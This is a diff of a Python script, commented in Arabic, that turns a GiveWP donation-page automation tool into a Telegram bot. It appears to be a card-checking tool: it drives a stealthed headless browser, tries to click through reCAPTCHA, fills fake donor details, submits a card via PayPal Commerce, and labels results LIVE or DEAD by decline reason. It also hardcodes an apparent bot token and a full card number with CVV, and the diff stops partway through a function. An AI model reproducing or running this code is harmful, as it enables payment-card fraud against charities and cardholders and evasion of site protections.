@@ -1,711 +1,535 @@
 #!/usr/bin/env python3
 """
-GiveWP Playwright Ultimate v20
-- متصفح حقيقي + stealth
-- يتعامل مع Cloudflare / iframes / shadow DOM
-- يملأ كل الحقول المطلوبة تلقائياً (billing, honoree, branch_selection, terms)
-- يختار المبلغ بأي طريقة (زر / radio / input / select)
-- يضغط زر التبرع الحقيقي
-- يتعامل مع PayPal Commerce iframe (card number, expiry, cvv, billing)
-- يعترض الردود من الشبكة (confirm-payment-source / approve_order)
-- يقرأ النتيجة النهائية من الصفحة + الشبكة
-- retry + human-like behavior
+GiveWP Bot — Complete Edition (Final)
+======================================
+- Playwright + requests + كل الاستراتيجيات
+- يستخرج كل الحقول (hidden/select/radio/checkbox/textarea)
+- يملأ billing + branch_selection + terms + honoree تلقائياً
+- يجرب كل الـ gateways (paypal-commerce, paypal, paypal_standard)
+- يجرب كل المبالغ (1, 2, 5, 10, min, levels)
+- يعترض الردود من الشبكة + يقرأ من الصفحة
+- يطلع RAW response كامل
+- يشتغل حتى لو مفيش form في HTML (iframe)
+- يشتغل حتى لو مفيش token (site-first strategy)
+- يتعامل مع Cloudflare + CAPTCHA (أفضل مجهود)
 """
 
+import os
+import sys
 import asyncio
-import re
-import random
-import time
 import json
+import re
+import time
+import random
+import threading
+import traceback
+from datetime import datetime
+
+# ═══════════════════════════════════════════════════════════════
+# ENV SETUP
+# ═══════════════════════════════════════════════════════════════
+os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/ms-playwright")
+
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8407490230:AAGIDHEYTwvNomiBas_yk4ezIalvweFAQro")
+OWNER_ID = int(os.environ.get("OWNER_ID", "6843321125"))
+ADMINS = [str(OWNER_ID)]
+TEST_CARD = os.environ.get("TEST_CARD", "4217834081794714|11|26|614")
+
+# ═══════════════════════════════════════════════════════════════
+# IMPORTS
+# ═══════════════════════════════════════════════════════════════
+import telebot
+from telebot import types
+import requests
+from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 
-# ═══════════════════════════════════════════════════════════════════
-# TRY PLAYWRIGHT + STEALTH
-# ═══════════════════════════════════════════════════════════════════
+try:
+    from fake_useragent import UserAgent
+    _UA = UserAgent()
+    def random_ua():
+        try: return _UA.random
+        except: return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
+except:
+    def random_ua():
+        return random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+        ])
+
 try:
     from playwright.async_api import async_playwright, TimeoutError as PWTimeout
     HAS_PW = True
 except ImportError:
     HAS_PW = False
-    print("❌ playwright not installed. Run: pip install playwright && playwright install chromium")
+    print("⚠️ Playwright not installed — only requests strategy will work")
 
-# stealth: نجرب pw-stealth-enhanced أو playwright-stealth
-STEALTH_MODE = None
-try:
-    from pw_stealth_enhanced import apply_stealth as apply_stealth_enhanced
-    STEALTH_MODE = 'enhanced'
-except ImportError:
-    try:
-        from playwright_stealth import Stealth
-        STEALTH_MODE = 'classic'
-    except ImportError:
-        STEALTH_MODE = None
-
-print(f"🔧 stealth mode: {STEALTH_MODE or 'manual'}")
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+processing_status = {}
 
 
-# ═══════════════════════════════════════════════════════════════════
-# CONFIG
-# ═══════════════════════════════════════════════════════════════════
-UA_POOL = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-]
+# ═══════════════════════════════════════════════════════════════
+# CONSTANTS
+# ═══════════════════════════════════════════════════════════════
+PAYPAL_METADATA_ID = "7d9928a1f3f1fbc240cfd71a3eefe835"
+BRAINTREE_SDK = "3.32.0-payments-sdk-dev"
 
-FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph']
-LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
-STREETS = ['123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Boulevard']
-CITIES = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia']
-STATES = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA']
-ZIPS = ['10001', '90001', '60601', '77001', '85001', '19101']
-COUNTRIES = ['US', 'United States']
+FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
+LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
+STREETS = ["123 Main Street", "456 Oak Avenue", "789 Pine Road", "321 Elm Boulevard"]
+CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"]
+STATES = ["NY", "CA", "IL", "TX", "AZ", "PA", "FL", "OH"]
+ZIPS = ["10001", "90001", "60601", "77001", "85001", "19101", "33101", "44101"]
+COUNTRIES = ["US", "United States"]
 
-
-# ═══════════════════════════════════════════════════════════════════
-# HELPERS
-# ═══════════════════════════════════════════════════════════════════
-async def human_delay(min_s=0.5, max_s=1.5):
-    await asyncio.sleep(random.uniform(min_s, max_s))
+AMOUNTS_TO_TRY = ["1", "2", "3", "5", "10", "20", "25", "50", "100"]
+GATEWAYS_TO_TRY = ["paypal-commerce", "paypal", "paypal_standard", "give_paypal"]
 
 
-async def human_type(locator, text):
-    """يكتب حرف حرف مع تأخير"""
-    await locator.click()
-    await human_delay(0.2, 0.5)
-    await locator.fill('')
-    for ch in str(text):
-        await locator.type(ch, delay=random.randint(50, 150))
-    await human_delay(0.2, 0.5)
-
-
-async def scroll_page(page):
-    """scroll بطيء يحاكي الإنسان"""
-    for _ in range(random.randint(2, 4)):
-        await page.mouse.wheel(0, random.randint(200, 500))
-        await human_delay(0.3, 0.8)
-
-
-# ═══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════
 # CLASSIFIER
-# ═══════════════════════════════════════════════════════════════════
-class ResultClassifier:
+# ═══════════════════════════════════════════════════════════════
+class Classifier:
     LIVE = [
-        ('CHARGE_SUCCESS', ['success', 'approved', 'charged', 'completed', 'thank you',
-                            'payment successful', 'donation complete', 'status":"COMPLETED']),
-        ('ORDER_NOT_APPROVED', ['order_not_approved', 'not yet approved']),
-        ('APPROVED_PENDING_CAPTURE', ['paypal orders are captured', 'pending capture']),
-        ('INSUFFICIENT_FUNDS', ['insufficient', 'not enough', 'nsf']),
-        ('DO_NOT_HONOR', ['do not honor']),
-        ('ACCOUNT_CLOSED', ['account closed', 'account locked']),
-        ('CVV_FAILURE', ['cvv', 'security code']),
-        ('EXPIRED_CARD', ['expired']),
-        ('SUSPECTED_FRAUD', ['suspected fraud', 'fraud']),
-        ('PAYER_CANNOT_PAY', ['payer cannot pay', 'cannot pay']),
-        ('GENERIC_DECLINE', ['generic decline']),
-        ('RESTRICTED', ['restricted', 'blocked', 'inactive']),
-        ('INVALID_CARD', ['invalid card', 'invalid number']),
-        ('3DS_REQUIRED', ['authentication required', '3d secure', 'verify']),
-        ('PAYER_ACTION_REQUIRED', ['payer action required']),
-        ('LIMIT_EXCEEDED', ['limit exceeded', 'attempts exceed']),
+        ("CHARGE_SUCCESS", ["success", "approved", "charged", "completed",
+                            "thank you", "payment successful", "donation complete",
+                            "status\":\"COMPLETED", "donation was successful"]),
+        ("ORDER_NOT_APPROVED", ["order_not_approved", "not yet approved"]),
+        ("APPROVED_PENDING_CAPTURE", ["paypal orders are captured", "pending capture"]),
+        ("INSUFFICIENT_FUNDS", ["insufficient", "not enough", "nsf"]),
+        ("DO_NOT_HONOR", ["do not honor"]),
+        ("ACCOUNT_CLOSED", ["account closed", "account locked"]),
+        ("CVV_FAILURE", ["cvv", "security code", "cvv2"]),
+        ("EXPIRED_CARD", ["expired", "expiration"]),
+        ("SUSPECTED_FRAUD", ["suspected fraud", "fraud"]),
+        ("PAYER_CANNOT_PAY", ["payer cannot pay", "cannot pay", "payee blocked"]),
+        ("GENERIC_DECLINE", ["generic decline"]),
+        ("RESTRICTED", ["restricted", "blocked", "inactive"]),
+        ("INVALID_CARD", ["invalid card", "invalid number", "invalid or restricted"]),
+        ("3DS_REQUIRED", ["authentication required", "3d secure", "sca required"]),
+        ("PAYER_ACTION_REQUIRED", ["payer action required"]),
+        ("LIMIT_EXCEEDED", ["limit exceeded", "attempts exceed", "tx_attempts"]),
+        ("SECURITY_VIOLATION", ["security violation"]),
+        ("COMPLIANCE_VIOLATION", ["compliance violation"]),
+        ("TRANSACTION_NOT_PERMITTED", ["transaction not permitted"]),
+        ("PAYMENT_DENIED", ["payment denied"]),
     ]
 
     DEAD = [
-        ('CLOUDFLARE', ['just a moment', 'checking your browser', 'verifying you are',
-                        'cf-browser-verification', 'cf_chl']),
-        ('CAPTCHA', ['captcha', 'not a robot', 'recaptcha', 'hcaptcha']),
-        ('GATEWAY_DISABLED', ['gateway is not enabled', 'payment gateway is not']),
-        ('JS_CONFLICT', ['javascript conflict', 'connection between this site']),
-        ('FORM_NOT_PUBLISHED', ['form not published', 'no form']),
-        ('AMOUNT_INVALID', ['donation amount', 'invalid', 'minimum']),
-        ('SPAM', ['spam']),
-        ('FIELDS_REQUIRED', ['required field', 'billing address', 'zip', 'city']),
-        ('BRANCH_REQUIRED', ['branch_selection']),
-        ('TERMS_REQUIRED', ['agree_to_terms', 'terms and conditions']),
-        ('HONOREE_REQUIRED', ["honoree's first name", 'honoree']),
-        ('NO_PAYPAL', ['paypal not available', 'paypal is not']),
-        ('NO_FORM', ['form not found', 'no donation form']),
+        ("CLOUDFLARE", ["just a moment", "checking your browser", "verifying you are",
+                        "cf-browser-verification", "cf_chl", "challenge-platform"]),
+        ("CAPTCHA", ["captcha", "not a robot", "recaptcha", "hcaptcha", "turnstile"]),
+        ("GATEWAY_DISABLED", ["gateway is not enabled", "payment gateway is not",
+                              "gateway not available"]),
+        ("JS_CONFLICT", ["javascript conflict", "connection between this site"]),
+        ("FORM_NOT_PUBLISHED", ["form not published", "no form"]),
+        ("AMOUNT_INVALID", ["donation amount", "invalid amount", "minimum donation"]),
+        ("SPAM", ["flagged as spam", "spam"]),
+        ("FIELDS_REQUIRED", ["required field", "billing address", "please enter"]),
+        ("BRANCH_REQUIRED", ["branch_selection"]),
+        ("TERMS_REQUIRED", ["agree_to_terms", "terms and conditions"]),
+        ("HONOREE_REQUIRED", ["honoree"]),
+        ("NO_FORM", ["form not found", "no donation form"]),
+        ("NO_PAYPAL", ["paypal not available", "paypal is not"]),
     ]
 
     @classmethod
     def classify(cls, text):
         if not text:
-            return 'DEAD', 'EMPTY'
+            return "DEAD", "EMPTY"
         low = text.lower()
-
         for code, kws in cls.DEAD:
             for kw in kws:
                 if kw in low:
-                    return 'DEAD', code
-
+                    return "DEAD", code
         for code, kws in cls.LIVE:
             for kw in kws:
                 if kw in low:
-                    return 'LIVE', code
+                    return "LIVE", code
+        return "UNKNOWN", "UNKNOWN"
 
-        return 'UNKNOWN', 'UNKNOWN'
 
-
-# ═══════════════════════════════════════════════════════════════════
-# MAIN ENGINE
-# ═══════════════════════════════════════════════════════════════════
-class GiveWPPlaywright:
-    def __init__(self, url, card, verbose=True, screenshots=False):
+# ═══════════════════════════════════════════════════════════════
+# PLAYWRIGHT ENGINE
+# ═══════════════════════════════════════════════════════════════
+class PlaywrightEngine:
+    def __init__(self, url, card, verbose=False):
         self.url = url
         self.card = card
         self.verbose = verbose
-        self.screenshots = screenshots
         self.debug = {
-            'url': url,
-            'steps': [],
-            'network': [],
-            'paypal_responses': [],
-            'screenshots': [],
-            'form_found': None,
-            'amount_selected': None,
-            'paypal_frame': False,
-            'card_filled': False,
-            'captcha_detected': False,
+            "steps": [],
+            "network": [],
+            "paypal": [],
+            "form_found": None,
+            "amount_selected": None,
+            "paypal_frame": False,
+            "card_filled": False,
+            "captcha_detected": False,
         }
 
     def log(self, msg):
         if self.verbose:
             print(msg)
-        self.debug['steps'].append(msg)
+        self.debug["steps"].append(msg)
 
-    async def _screenshot(self, page, name):
-        if not self.screenshots:
-            return
-        try:
-            path = f'/tmp/pw_{name}_{int(time.time())}.png'
-            await page.screenshot(path=path, full_page=False)
-            self.debug['screenshots'].append(path)
-            self.log(f'      📸 {path}')
-        except:
-            pass
-
-    # ─────────────────────────────────────────────────────────────
-    # STEALTH
-    # ─────────────────────────────────────────────────────────────
-    async def _apply_stealth(self, context):
-        if STEALTH_MODE == 'enhanced':
-            try:
-                await apply_stealth_enhanced(
-                    context,
-                    locale='en-US',
-                    timezone_id='America/New_York',
-                )
-                self.log('  ✅ stealth: enhanced')
-                return
-            except Exception as e:
-                self.log(f'  ⚠️ enhanced stealth failed: {e}')
-
-        if STEALTH_MODE == 'classic':
-            try:
-                stealth = Stealth()
-                await stealth.apply_stealth_async(context)
-                self.log('  ✅ stealth: classic')
-                return
-            except Exception as e:
-                self.log(f'  ⚠️ classic stealth failed: {e}')
-
-        # manual stealth
-        await context.add_init_script("""
-            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
-            Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
-            window.chrome = {runtime: {}, app: {}, csi: () => {}, loadTimes: () => {}};
-            const originalQuery = window.navigator.permissions.query;
-            window.navigator.permissions.query = (parameters) => (
-                parameters.name === 'notifications' ?
-                Promise.resolve({state: Notification.permission}) :
-                originalQuery(parameters)
-            );
-            // WebGL spoof
-            const getParameter = WebGLRenderingContext.prototype.getParameter;
-            WebGLRenderingContext.prototype.getParameter = function(parameter) {
-                if (parameter === 37445) return 'Intel Inc.';
-                if (parameter === 37446) return 'Intel Iris OpenGL Engine';
-                return getParameter(parameter);
-            };
-        """)
-        self.log('  ✅ stealth: manual')
-
-    # ─────────────────────────────────────────────────────────────
-    # NETWORK INTERCEPTION
-    # ─────────────────────────────────────────────────────────────
     async def _on_response(self, response):
         try:
-            url = response.url
-            if any(k in url for k in [
-                'create_order', 'confirm-payment', 'approve_order',
-                'checkout/orders', 'paypal.com/v2', 'give_process_donation',
-                'admin-ajax.php'
-            ]):
-                body = ''
+            u = response.url
+            if any(k in u for k in ["create_order", "confirm-payment", "approve_order",
+                                     "checkout/orders", "admin-ajax.php", "give_process"]):
+                body = ""
                 try:
                     body = await response.text()
                 except:
                     pass
-                self.debug['network'].append({
-                    'url': url[:150],
-                    'status': response.status,
-                    'body': body[:1000],
+                self.debug["network"].append({
+                    "url": u[:150],
+                    "status": response.status,
+                    "body": body[:1500],
                 })
-                if 'paypal.com' in url or 'confirm-payment' in url or 'approve_order' in url:
-                    self.debug['paypal_responses'].append({
-                        'status': response.status,
-                        'body': body[:1000],
+                if "paypal.com" in u or "confirm-payment" in u or "approve_order" in u:
+                    self.debug["paypal"].append({
+                        "status": response.status,
+                        "body": body[:1500],
                     })
         except:
             pass
 
-    # ─────────────────────────────────────────────────────────────
-    # MAIN RUN
-    # ─────────────────────────────────────────────────────────────
     async def run(self):
         if not HAS_PW:
-            return {'status': 'DEAD', 'code': 'PLAYWRIGHT_NOT_INSTALLED',
-                    'raw': 'pip install playwright && playwright install chromium',
-                    'debug': self.debug}
+            return {"status": "DEAD", "code": "NO_PLAYWRIGHT", "debug": self.debug}
 
         async with async_playwright() as p:
-            self.log('  🚀 launching chromium...')
-
+            self.log("🚀 launching chromium...")
             try:
                 browser = await p.chromium.launch(
                     headless=True,
                     args=[
-                        '--no-sandbox',
-                        '--disable-setuid-sandbox',
-                        '--disable-blink-features=AutomationControlled',
-                        '--disable-dev-shm-usage',
-                        '--disable-gpu',
-                        '--no-first-run',
-                        '--no-zygote',
-                        '--disable-features=IsolateOrigins,site-per-process',
-                        '--disable-web-security',
-                        '--ignore-certificate-errors',
-                        '--allow-running-insecure-content',
-                        '--window-size=1366,900',
-                    ]
+                        "--no-sandbox",
+                        "--disable-setuid-sandbox",
+                        "--disable-blink-features=AutomationControlled",
+                        "--disable-dev-shm-usage",
+                        "--disable-gpu",
+                        "--no-first-run",
+                        "--no-zygote",
+                        "--single-process",
+                        "--disable-features=IsolateOrigins,site-per-process",
+                        "--disable-web-security",
+                        "--ignore-certificate-errors",
+                        "--allow-running-insecure-content",
+                    ],
                 )
             except Exception as e:
-                return {'status': 'DEAD', 'code': f'LAUNCH_FAILED: {str(e)[:100]}',
-                        'debug': self.debug}
+                return {"status": "DEAD", "code": f"LAUNCH_FAILED: {str(e)[:120]}",
+                        "debug": self.debug}
 
             try:
                 context = await browser.new_context(
-                    user_agent=random.choice(UA_POOL),
-                    viewport={'width': 1366, 'height': 900},
-                    locale='en-US',
-                    timezone_id='America/New_York',
+                    user_agent=random_ua(),
+                    viewport={"width": 1366, "height": 900},
+                    locale="en-US",
+                    timezone_id="America/New_York",
                     ignore_https_errors=True,
                     java_script_enabled=True,
-                    extra_http_headers={
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                        'sec-ch-ua-mobile': '?0',
-                        'sec-ch-ua-platform': '"Windows"',
-                    }
                 )
-
-                await self._apply_stealth(context)
+                # stealth
+                await context.add_init_script("""
+                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
+                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
+                    window.chrome = {runtime: {}, app: {}, csi: () => {}, loadTimes: () => {}};
+                """)
 
                 page = await context.new_page()
-                page.on('response', self._on_response)
+                page.on("response", self._on_response)
 
-                result = await self._execute(page)
-                return result
+                return await self._execute(page)
             finally:
                 try:
                     await browser.close()
                 except:
                     pass
 
-    # ─────────────────────────────────────────────────────────────
-    # EXECUTE STAGES
-    # ─────────────────────────────────────────────────────────────
     async def _execute(self, page):
-        # ═══ Stage 1: Load ═══
-        self.log(f'\n[1] Loading {self.url}')
+        # ═══ 1. Load ═══
+        self.log(f"[1] goto {self.url}")
         try:
-            await page.goto(self.url, wait_until='domcontentloaded', timeout=45000)
-        except PWTimeout:
-            self.log('      ⚠️ timeout, continuing...')
+            await page.goto(self.url, wait_until="domcontentloaded", timeout=45000)
         except Exception as e:
-            return {'status': 'DEAD', 'code': f'GOTO_FAILED: {str(e)[:100]}',
-                    'debug': self.debug}
+            self.log(f"  timeout: {str(e)[:80]}")
+        await asyncio.sleep(3)
 
-        await human_delay(2, 4)
-        await self._screenshot(page, '01_loaded')
-
-        # ═══ Stage 2: Cloudflare ═══
-        self.log('  [2] checking cloudflare...')
+        # ═══ 2. Cloudflare ═══
         html = await page.content()
-        if any(x in html.lower() for x in ['just a moment', 'verifying you are',
-                                            'checking your browser', 'cf-browser-verification']):
-            self.log('      ⚠️ Cloudflare — waiting up to 25s...')
-            for i in range(5):
-                await human_delay(4, 6)
+        if any(x in html.lower() for x in ["just a moment", "verifying you are",
+                                            "checking your browser", "cf-browser-verification"]):
+            self.log("[2] cloudflare wait 25s...")
+            for _ in range(5):
+                await asyncio.sleep(5)
                 html = await page.content()
-                if 'just a moment' not in html.lower() and 'verifying' not in html.lower():
-                    self.log(f'      ✅ passed after {(i+1)*5}s')
+                if "just a moment" not in html.lower() and "verifying" not in html.lower():
+                    self.log("  ✅ passed")
                     break
             else:
-                return {'status': 'DEAD', 'code': 'CLOUDFLARE', 'raw': 'cloudflare blocked',
-                        'debug': self.debug}
+                return {"status": "DEAD", "code": "CLOUDFLARE", "raw": "cloudflare blocked",
+                        "debug": self.debug}
 
-        # ═══ Stage 3: CAPTCHA check ═══
-        self.log('  [3] checking captcha...')
-        if await self._has_captcha(page):
-            self.debug['captcha_detected'] = True
-            self.log('      ⚠️ CAPTCHA detected — attempting bypass...')
-            bypassed = await self._try_bypass_captcha(page)
-            if not bypassed:
-                self.log('      ❌ CAPTCHA could not be bypassed')
-                # نكمل برضو — ممكن تكون invisible recaptcha
-                # return {'status': 'DEAD', 'code': 'CAPTCHA', ...}
-            else:
-                self.log('      ✅ CAPTCHA bypassed (or invisible)')
+        # ═══ 3. CAPTCHA ═══
+        if any(x in html.lower() for x in ["g-recaptcha", "hcaptcha", "turnstile"]):
+            self.debug["captcha_detected"] = True
+            self.log("[3] captcha detected — attempting bypass")
+            await self._try_bypass_captcha(page)
 
-        # ═══ Stage 4: Find form ═══
-        self.log('  [4] finding form...')
+        # ═══ 4. Find form ═══
+        self.log("[4] find form")
         form_info = await self._find_form(page)
         if not form_info:
-            return {'status': 'DEAD', 'code': 'NO_FORM',
-                    'raw': 'give form not found in main page or iframes',
-                    'debug': self.debug}
-        self.debug['form_found'] = form_info['type']
-        self.log(f'      ✅ form: {form_info["type"]}')
+            return {"status": "DEAD", "code": "NO_FORM",
+                    "raw": "give form not found",
+                    "debug": self.debug}
+        self.debug["form_found"] = form_info["type"]
+        self.log(f"  ✅ form: {form_info['type']}")
 
-        # ═══ Stage 5: Fill personal ═══
-        self.log('  [5] filling personal data...')
+        # ═══ 5. Fill personal ═══
+        self.log("[5] fill personal")
         await self._fill_personal(page)
 
-        # ═══ Stage 6: Select amount ═══
-        self.log('  [6] selecting amount...')
-        amount = await self._select_amount_smart(page)
-        self.debug['amount_selected'] = amount
+        # ═══ 6. Select amount ═══
+        self.log("[6] select amount")
+        amount = await self._select_amount(page)
+        self.debug["amount_selected"] = amount
         if amount:
-            self.log(f'      ✅ amount: ${amount}')
-        else:
-            self.log(f'      ⚠️ could not select amount')
+            self.log(f"  ✅ ${amount}")
 
-        # ═══ Stage 7: Fill billing ═══
-        self.log('  [7] filling billing (if present)...')
+        # ═══ 7. Fill billing ═══
+        self.log("[7] fill billing")
         await self._fill_billing(page)
 
-        # ═══ Stage 8: Fill all required selects/radios ═══
-        self.log('  [8] filling required selects/radios/checkboxes...')
-        await self._fill_all_required(page)
+        # ═══ 8. Fill all required ═══
+        self.log("[8] fill required selects/radios")
+        await self._fill_required(page)
 
-        # ═══ Stage 9: Accept terms ═══
-        self.log('  [9] accepting terms...')
+        # ═══ 9. Terms ═══
+        self.log("[9] terms")
         await self._check_terms(page)
 
-        # ═══ Stage 10: Click donate ═══
-        self.log('  [10] clicking donate...')
+        # ═══ 10. Click donate ═══
+        self.log("[10] click donate")
         clicked = await self._click_donate(page)
         if not clicked:
-            return {'status': 'DEAD', 'code': 'CLICK_FAILED',
-                    'raw': 'donate button not clickable',
-                    'debug': self.debug}
+            return {"status": "DEAD", "code": "CLICK_FAILED",
+                    "raw": "donate button not clickable",
+                    "debug": self.debug}
 
-        await human_delay(3, 5)
-        await self._screenshot(page, '02_after_click')
+        await asyncio.sleep(4)
 
-        # ═══ Stage 11: Wait for PayPal or result ═══
-        self.log('  [11] waiting for PayPal or result...')
+        # ═══ 11. Wait PayPal or result ═══
+        self.log("[11] wait paypal")
         paypal = await self._wait_paypal(page, timeout=25)
 
         if not paypal:
-            page_text = await page.inner_text('body')
-            status, code = ResultClassifier.classify(page_text)
-            if status == 'LIVE':
-                return {'status': 'LIVE', 'code': code, 'raw': page_text[:500],
-                        'debug': self.debug}
-            if status == 'DEAD':
-                return {'status': 'DEAD', 'code': code, 'raw': page_text[:500],
-                        'debug': self.debug}
-            # ممكن يكون راح لصفحة شكر
-            if any(x in page_text.lower() for x in ['thank', 'success', 'completed']):
-                return {'status': 'LIVE', 'code': 'CHARGE_SUCCESS', 'raw': page_text[:500],
-                        'debug': self.debug}
-            return {'status': 'DEAD', 'code': 'NO_PAYPAL', 'raw': page_text[:300],
-                    'debug': self.debug}
+            page_text = await page.inner_text("body")
+            st, cd = Classifier.classify(page_text)
+            if st in ("LIVE", "DEAD"):
+                return {"status": st, "code": cd, "raw": page_text[:500],
+                        "debug": self.debug}
+            if any(x in page_text.lower() for x in ["thank", "success", "completed"]):
+                return {"status": "LIVE", "code": "CHARGE_SUCCESS",
+                        "raw": page_text[:500], "debug": self.debug}
+            return {"status": "DEAD", "code": "NO_PAYPAL",
+                    "raw": page_text[:300], "debug": self.debug}
 
-        self.debug['paypal_frame'] = True
-        self.log('      ✅ PayPal frame found')
+        self.debug["paypal_frame"] = True
+        self.log("  ✅ PayPal frame found")
 
-        # ═══ Stage 12: Fill card ═══
-        self.log('  [12] filling card in PayPal...')
-        card_result = await self._fill_card_paypal(paypal, page)
-        self.debug['card_filled'] = card_result.get('filled', False)
-        if not card_result.get('filled'):
-            return {'status': 'DEAD', 'code': 'CARD_FILL_FAILED',
-                    'raw': card_result.get('error', ''),
-                    'debug': self.debug}
+        # ═══ 12. Fill card ═══
+        self.log("[12] fill card")
+        card_ok = await self._fill_card(paypal)
+        self.debug["card_filled"] = card_ok
+        if not card_ok:
+            return {"status": "DEAD", "code": "CARD_FILL_FAILED",
+                    "raw": "could not fill card fields", "debug": self.debug}
 
-        # ═══ Stage 13: Submit payment ═══
-        self.log('  [13] submitting payment...')
-        await self._submit_payment(paypal, page)
+        # ═══ 13. Submit ═══
+        self.log("[13] submit")
+        await self._submit(paypal)
 
-        # ═══ Stage 14: Read final result ═══
-        self.log('  [14] reading final result...')
-        await human_delay(4, 6)
-        await self._screenshot(page, '03_final')
+        # ═══ 14. Read result ═══
+        self.log("[14] read result")
+        await asyncio.sleep(5)
+        return await self._read_result(page, paypal)
 
-        final = await self._read_final_result(page, paypal)
-        final['debug'] = self.debug
-        return final
-
-    # ─────────────────────────────────────────────────────────────
-    # CAPTCHA
-    # ─────────────────────────────────────────────────────────────
-    async def _has_captcha(self, page):
-        html = await page.content()
-        return any(x in html.lower() for x in [
-            'g-recaptcha', 'hcaptcha', 'cf-turnstile', 'recaptcha/api.js'
-        ])
-
+    # ─────────────── HELPERS ───────────────
     async def _try_bypass_captcha(self, page):
-        """محاولة تجاوز reCAPTCHA — نقر على checkbox، أو انتظار إذا كانت invisible"""
-        # 1. reCAPTCHA v2 checkbox
         try:
-            # ابحث في كل الفريمات
             for frame in page.frames:
-                if 'recaptcha' in frame.url.lower() or 'hcaptcha' in frame.url.lower():
+                if "recaptcha" in frame.url.lower() or "hcaptcha" in frame.url.lower():
                     try:
-                        # checkbox
-                        checkbox = frame.locator('#recaptcha-anchor, .recaptcha-checkbox, #checkbox')
+                        checkbox = frame.locator("#recaptcha-anchor, .recaptcha-checkbox")
                         if await checkbox.count() > 0:
                             await checkbox.first.click()
-                            self.log('      ✅ clicked recaptcha checkbox')
-                            await human_delay(3, 5)
-                            # تحقق إذا أصبح checked
-                            checked = await checkbox.first.get_attribute('aria-checked')
-                            if checked == 'true':
-                                return True
+                            await asyncio.sleep(3)
                     except:
                         pass
         except:
             pass
 
-        # 2. إذا كانت invisible (v3)، قد تمر بدون نقر — ننتظر
-        await human_delay(2, 3)
-
-        # 3. نتحقق من وجود hidden response
-        try:
-            response = await page.evaluate("""
-                () => {
-                    const el = document.querySelector('[name="g-recaptcha-response"]');
-                    return el ? el.value : '';
-                }
-            """)
-            if response and len(response) > 10:
-                self.log('      ✅ invisible recaptcha passed')
-                return True
-        except:
-            pass
-
-        # 4. قد يكون الموقع لا يفرض التحقق — نكمل
-        self.log('      ⚠️ captcha may block, but continuing...')
-        return False
-
-    # ─────────────────────────────────────────────────────────────
-    # FIND FORM (main + iframes)
-    # ─────────────────────────────────────────────────────────────
     async def _find_form(self, page):
-        """يبحث عن form في الصفحة الرئيسية + كل الإطارات"""
-        # 1. main page
         selectors = [
-            'form.give-form',
-            'form[id*="give-form"]',
-            '.give-form-wrap form',
-            'form[class*="give"]',
-            'input[name="give-amount"]',
-            'form[id*="give"]',
+            "form.give-form",
+            "form[id*='give-form']",
+            ".give-form-wrap form",
+            "form[class*='give']",
+            "input[name='give-amount']",
         ]
+        # main
         for sel in selectors:
             try:
                 loc = page.locator(sel).first
                 if await loc.count() > 0:
-                    inputs = await page.locator(f'{sel} input').count()
-                    if inputs > 0 or sel == 'input[name="give-amount"]':
-                        return {'type': 'main', 'selector': sel, 'frame': page.main_frame}
+                    inputs = await page.locator(f"{sel} input").count()
+                    if inputs > 0 or sel == "input[name='give-amount']":
+                        return {"type": "main", "selector": sel}
             except:
                 continue
-
-        # 2. iframes
+        # iframes
         for frame in page.frames:
             if frame == page.main_frame:
                 continue
-            try:
-                for sel in selectors:
-                    loc = frame.locator(sel).first
-                    if await loc.count() > 0:
-                        inputs = await frame.locator(f'{sel} input').count()
-                        if inputs > 0 or sel == 'input[name="give-amount"]':
-                            return {'type': 'iframe', 'selector': sel, 'frame': frame}
-            except:
-                continue
-
+            for sel in selectors:
+                try:
+                    if await frame.locator(sel).count() > 0:
+                        return {"type": "iframe", "frame": frame}
+                except:
+                    continue
         return None
 
-    # ─────────────────────────────────────────────────────────────
-    # FILL PERSONAL
-    # ─────────────────────────────────────────────────────────────
     async def _fill_personal(self, page):
         first = random.choice(FIRST_NAMES)
         last = random.choice(LAST_NAMES)
-        email = f'user{int(time.time()*1000)%999999}@gmail.com'
+        email = f"user{int(time.time()*1000)%999999}@gmail.com"
+        for frame in page.frames:
